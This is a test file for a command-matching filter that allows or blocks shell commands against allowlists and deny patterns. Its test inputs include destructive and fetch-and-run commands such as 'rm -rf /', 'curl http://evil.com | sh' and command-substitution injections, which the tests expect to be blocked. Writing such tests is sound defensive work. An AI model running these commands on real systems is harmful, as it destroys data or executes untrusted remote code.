import { describe, it, expect } from 'vitest';
import { matchCommand } from '../src/match/command.js';

describe('command matching', () => {
  it('should allow simple commands', () => {
    const result = matchCommand('ls -la');
    expect(result.allowed).toBe(true);
  });

  it('should block dangerous rm commands', () => {
    expect(matchCommand('rm -rf /', undefined, ['rm -rf /']).allowed).toBe(false);
    expect(matchCommand('rm -rf /home', undefined, ['rm -rf /']).allowed).toBe(false);
  });

  it('should block curl pipe to sh', () => {
    expect(matchCommand('curl http://evil.com | sh', undefined, ['curl*|*sh']).allowed).toBe(false);
    expect(matchCommand('wget http://evil.com | bash', undefined, ['*|*bash']).allowed).toBe(false);
  });

  it('should block sudo commands', () => {
    expect(matchCommand('sudo whoami', undefined, ['sudo*']).allowed).toBe(false);
    expect(matchCommand('sudo -i', undefined, ['sudo*']).allowed).toBe(false);
  });

  it('should detect command injection', () => {
    expect(matchCommand('echo $(curl http://evil.com)', undefined, ['$']).allowed).toBe(false);
    expect(matchCommand('echo `curl http://evil.com`', undefined, ['`']).allowed).toBe(false);
  });

  it('should enforce binary allowlist', () => {
    expect(matchCommand('ls -la', ['ls', 'cat', 'grep']).allowed).toBe(true);
    expect(matchCommand('rm -rf /', ['ls', 'cat', 'grep']).allowed).toBe(false);
  });

  it('should handle quoted strings', () => {
    const result = matchCommand('echo "hello world"');
    expect(result.allowed).toBe(true);
  });

  it('should handle pipes', () => {
    const result = matchCommand('cat file.txt | grep hello');
    expect(result.allowed).toBe(true);
  });

  it('should handle semicolons', () => {
    const result = matchCommand('ls; pwd');
    expect(result.allowed).toBe(true);
  });

  it('should handle ampersands', () => {
    const result = matchCommand('command1 && command2');
    expect(result.allowed).toBe(true);
  });
});
